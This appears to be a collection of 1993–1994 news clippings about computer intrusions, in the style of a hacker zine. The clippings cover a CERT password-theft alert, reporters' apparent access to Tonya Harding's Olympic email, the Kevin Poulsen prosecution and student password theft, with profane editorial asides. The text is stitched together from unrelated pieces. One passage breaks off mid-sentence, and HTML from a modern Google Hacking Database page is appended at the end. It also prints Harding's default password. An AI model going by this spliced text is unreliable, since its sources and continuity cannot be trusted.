Sadomasochists meet the cyberpunks.  Leather meet hypernormalcy.  Body
piercing meet network surfing (communicating by computer).  It was a night
for mingling among the subcultures to share their different approaches to
messing with mind and body.

The recent party at the S&amp;M club &quot;Club Fuck&quot; was organized by &quot;Boing Boing,&quot;
a zine that focuses on the kinetic, futuristic world of the new frontier
known as cyberspace.  This place doesn&#039;t exist in a physical location, but
anyone can visit from their home computer by hooking into vast electronic
networks.

A blindfolded man dressed in a jock strap and high heeled boots stood on
stage while helpers pinned flashing Christmas lights to his flesh with thin
needles.  Then a man with deer antlers tied to his forehead whipped him.

The crowd of mostly twentysomethings who came to the club because of the
cyber theme observed with stony expressions.  Chris Gardner, 24, an
architecture student who studied virtual reality in school, covered his
eyes with his hand.

No one, really was &quot;fitting in.&quot;  The sadomasochists looked curiously at the
very-average-looking cyber fans, who openly gawked back at the black
leather, nudity and body piercing.

Sharing subcultures can be so much fun.

Intruder Alert On Internet                                February 4, 1994
~~~~~~~~~~~~~~~~~~~~~~~~~~
AP News Sources

Intruders have broken into the giant Internet computer network and users are
being advised to protect themselves by changing their passwords.

The breaks-ins may jeopardize the work of tens of thousands of computer
users, warned the Computer Emergency Response Team, based at Carnegie
Mellon University in Pittsburgh.

&quot;Intruders have already captured access information for tens of
thousands of systems across the Internet,&quot; said an emergency response
team sent out on the network late Thursday.

Passwords were obtained by the intruders using a &quot;Trojan horse
program,&quot; so called because it can enter the main computer for some
legitimate purpose, but with coding that lets it remain after that
purpose is accomplished.

The program then records the first 128 keystrokes when someone else
connects to the Internet, and the illegal user later dials in and
receives that information. The first keystrokes of a user generally
contain such information as name and password of the user. Once they
know that the intruders can then sign on as the person whose password
they have stolen, read that person&#039;s files and change them if they
wish.

Harding Email Compromised by Journalists                 February 27, 1994
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
by C.W. Nevius (SF Chronicle)

In another example of the media circus that has dogged Tonya Harding,
a number of American journalists have apparently obtained the secret computer
code numbers that would allow them to read Harding&#039;s personal electronic mail
at the Winter Olympics.

No reporters have admitted reading Harding&#039;s electronic mail, but the
apparent access to private communications has caused concern among those
covering the Games.

The Olympic computer system is one of the most popular communications devices
at the Games.  Any member of the Olympic family -- media, athlete or Olympic
official -- can message anyone else from any of several hundred
computer terminals all over the Olympic venues.

The flaw in the system is that it is not especially difficult to
break the personal code.  Every accredited member of the Olympic family is
given an identification number.  It is written on both the front and back
of the credential everyone wears at the Games.  Anyone who has a face-to-face
meeting with an athlete would be able to pick up the accreditation number,
if the person knew where to look.

Each person is also given a &quot;Secret&quot; password to access the communication
system.  At the outset, the password was comprised of the digits corresponding
to that person&#039;s birth date.  Although Olympic officials advised everyone
to choose their own password, Harding apparently never got around to doing
so.

Harding&#039;s initial password would have been 1112, because her birthday
is the 11th of December.

Although none of the writers at the Olympics has admitted reading Harding&#039;s
personal electronic mail, it would be difficult, if not impossible, to
determine if anyone did any actual snooping.  There are no records kept
of who signs on to the computer from any particular terminal.

Reality Check                                                 January 1994
~~~~~~~~~~~~~
by Doug Fine (Spin) (Page 62)

I ask accused hacker Kevin Lee Poulsen if, as he approaches three years in
jail without trial, he has any regrets about his computer-related activities.
Without missing a beat, and breaking a media silence that began with his
first arrest in 1988, he answers: &quot;I regret shopping at Hughes Supermarket.
I&#039;m thinking of organizing a high-tech boycott.&quot;

Poulsen is referring to the site of his 1991 bust in Van Nuys, California.
There, between the aisles of foodstuffs, two zealous bag-boys -- their resolve
boosted by a recent episode of Unsolved Mysteries that featured the alleged
criminal -- jumped the 25-year-old, wrestled him to the ground, and handed
the suspect over to the security agents waiting outside.

Poulsen still kicks himself for returning to Hughes a second time that
spring evening.  According to court documents, a former hacker crony of
Poulsen&#039;s, threatened with his own prison sentence, had tipped off the
FBI that Poulsen might be stopping by.

What, I ask him, had he needed so badly that he felt compelled to return
to a supermarket at midnight?

&quot;Do you even have to ask?&quot; he says. &quot;Condoms, of course.&quot;

Key Evidence in Computer Case Disallowed                   January 4, 1994
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Los Angeles Staff Writers (Los Angeles Times) (Page B3)

U.S. District Judge Ronald Whyte in San Jose said computer tapes found
in a storage locker rented by Kevin Lee Poulsen should not have been
examined by prosecutors without a search warrant and cannot be used as
evidence.

Whyte had ruled the tapes admissible last month but changed his mind,
saying he had overlooked evidence that should have put a police officer
on notice of Poulsen&#039;s  privacy rights.

In addition to illegal possession of classified government secrets,
Poulsen faces 13 other charges, including eavesdroping on telephone
conversations, and tapping into Pacific Bell&#039;s computer and an unclassified
military computer network. He could be sentenced to 85 years in prison if
convicted of all charges.

His lawyer, Paul Meltzer of Santa Cruz, said the sole evidence of the
espionage charge is contained on one of the storage locker tapes. Meltzer
said a government analyst found that the tape contained a 1987 order,
classified secret, concerning a military exercise.

Poulsen, who lived in Menlo Park at the time of his arrest in the San
Jose case, worked in the mid-1980s as a consultant testing Pentagon computer
security. He was arrested in 1988 on some of the hacking charges, disappeared
and was picked up in April, 1991, after a tip prompted by a television show.

Hacker to ask charges be dropped                           January 4, 1994
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
UPI News Sources

An attorney for a former Silicon Valley computer expert accused of raiding
confidential electronic government files said Tuesday he will ask to have
charges dismissed now that a federal judge has thrown out the government&#039;s
chief evidence.

Attorney Peter Leeming said the government&#039;s case against Kevin L.
Poulsen is in disarray following a ruling suppressing computer tapes and
other evidence seized from a rented storage locker in 1988.

&#039;&#039;We&#039;re ready to go to trial in the case, and actually we&#039;re looking
forward to it,&#039;&#039; Leeming said.

Poulsen is charged with espionage and other offenses stemming from his
hacking into military and Pacific Bell telephone computers. The government
alleges that  Poulsen illegally obtained confidential military computer codes
and confidential information on court-ordered wiretaps.

The Password is Loopholes                                    March 1, 1994
~~~~~~~~~~~~~~~~~~~~~~~~~
by Joshua Quittner (Newsday) (Page 61)

You&#039;d think that Polytechnic University, in Brooklyn, one of the finer
technical schools in the country, would know how to safeguard its
computer system against hacker intrusions. And you&#039;d think the same of
New York University&#039;s Courant Institute, which hosts the mathematical
and computer science departments.

But a teenage Brooklyn hacker, who calls himself Iceman, and some
of his friends say they invaded the schools Internet-connected
computers and snatched the passwords of 103 students.

Internet break-ins have been a national news story lately, with
reports that unknown intruders have purloined more than 10,000 passwords
in a burst of activity during recent months. The Federal Bureau of
Investigation is investigating, since so many &quot;federal-interest
computers&quot; are attached to the wide-open Internet and since it is a
crime to possess and use other peoples&#039; passwords.

Experts now believe that a group of young hackers who call
themselves The Posse are responsible for the break-ins, though who they
are and what they&#039;re after is unclear. Some people believe the crew is
merely collecting passwords for bragging rights, while others suspect
more insidious motives. Their approach is more sophisticated, from a
technical standpoint, than Iceman&#039;s. But the result is the same.

Now Iceman, who&#039;s 18, has nothing to do with The Posse, never heard
of it, in fact. He hangs with a group of budding New York City hackers
who call themselves MPI.

Iceman told me it was simple to steal 103 passwords on the
universities systems since each password was a common word or name.

What did Iceman and company do with the passwords?

He said mostly, they enjoy reading other people&#039;s files and e-mail.
&quot;Every once in a while,&quot; he said, &quot;you get something interesting.&quot;

 area.  And all the other MUDders could do was sit and watch!  WAHHHHH.

 Get a fucking life, people.  Wait, let me restate that; Get a
 FUCKING REAL LIFE!]

Hacking Goes Legit                                        February 7, 1993
~~~~~~~~~~~~~~~~~~
by Ann Steffora and Martin Cheek (Industry Week) (Page 43)

Corporations ARE using &quot;tiger teams&quot; and less glamorous methods to check
computer security.

[Uh, yeah.  Sure they are.  Hey, is that an accountant in your dumpster?
 Better tuck in that tie dude.  Don&#039;t forget your clipboard!

 I will put a computer security audit by me, or by anyone from the hacker
 community, against a computer security audit done by ANY of the following:
 Coopers &amp; Lybrand, Deloitte &amp; Touche, Arthur Andersen or Price Waterhouse.
 It&#039;s no contest.  These people are NOT computer people.  Period.

 Get the hell out of the computer business and go do my fucking taxes.]

                    <p>The <a href="/google-hacking-database">Google Hacking Database (GHDB)</a>
                        is a categorized index of Internet search engine queries designed to uncover interesting,
                        and usually sensitive, information made publicly available on the Internet. In most cases,
                        this information was never meant to be made public but due to any number of factors this
                        information was linked in a web document that was crawled by a search engine that
                        subsequently followed that link and indexed the sensitive information.
                    </p>

                    <p>The process known as “Google Hacking” was popularized in 2000 by Johnny
                        Long, a professional hacker, who began cataloging these queries in a database known as the
                        Google Hacking Database. His initial efforts were amplified by countless hours of community
                        member effort, documented in the book Google Hacking For Penetration Testers and popularised
                        by a barrage of media attention and Johnny’s talks on the subject such as this early talk
                        recorded at <a href="https://www.defcon.org/html/links/dc-archives/dc-13-archive.html"
                                       target="_blank" rel="noopener">DEFCON 13</a>. Johnny coined the term “Googledork” to refer
                        to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
                        the fact that this was not a “Google problem” but rather the result of an often
                        unintentional misconfiguration on the part of a user or a program installed by the user.
                        Over time, the term “dork” became shorthand for a search query that located sensitive
                        information and “dorks” were included with may web application vulnerability releases to
                        show examples of vulnerable web sites.
                    </p>

                    <p>After nearly a decade of hard work by the community, Johnny turned the GHDB
                        over to <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a> in November 2010, and it is now maintained as
                        an extension of the <a href="/">Exploit Database</a>. Today, the GHDB includes searches for
                        other online search engines such as <a href="https://www.bing.com/" target="_blank" rel="noopener">Bing</a>,
                        and other online repositories like <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>,
                        producing different, yet equally valuable results.
